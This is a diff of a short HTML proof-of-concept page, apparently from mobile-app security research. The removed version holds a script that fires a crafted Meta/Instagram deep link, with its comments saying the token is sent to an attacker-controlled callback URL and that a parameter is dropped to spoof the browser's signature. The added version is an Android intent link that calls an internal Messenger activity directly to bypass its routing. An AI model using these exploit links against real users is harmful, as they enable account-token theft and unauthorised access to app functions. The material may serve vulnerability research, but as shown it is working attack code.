@@ -1,26 +1,9 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Loading...</title>
-</head>
 <body>
-    <h1>Please wait...</h1>
-    
-    <script>
-        // 1. The URL where Instagram should send the stolen token
-        const attackerCallbackUrl = encodeURIComponent("https://linux-1723.github.io/test/callback.html");
-        
-        // 2. A real Meta App ID (we pulled this from your earlier logs)
-        const appId = "567067343352427";
-
-        // 3. Construct the malicious LVA deep link
-        // We omit the 'bn' parameter to force the app to spoof the browser's signature
-        const exploitUrl = `xapplva://?app_id=${appId}&redirect_uri=${attackerCallbackUrl}&state=hacked`;
-
-        // 4. Fire the exploit
-        setTimeout(() => {
-            window.location.href = exploitUrl;
-        }, 1000);
-    </script>
+    <h2>Messenger Routing Bypass</h2>
+    <a href="intent://user/1000#Intent;scheme=fb-messenger;package=com.facebook.orca;component=com.facebook.orca/com.facebook.messenger.intents.IntentHandlerActivity;S.intent_handler_delegate_method=openManageAiMemoryBottomSheet;S.intent_handler_delegate_arg1=should_skip_bottom_sheet=true;end" style="font-size: 20px; padding: 10px; background: purple; color: white;">
+    Test AI Memory
+    </a>
 </body>
 </html>
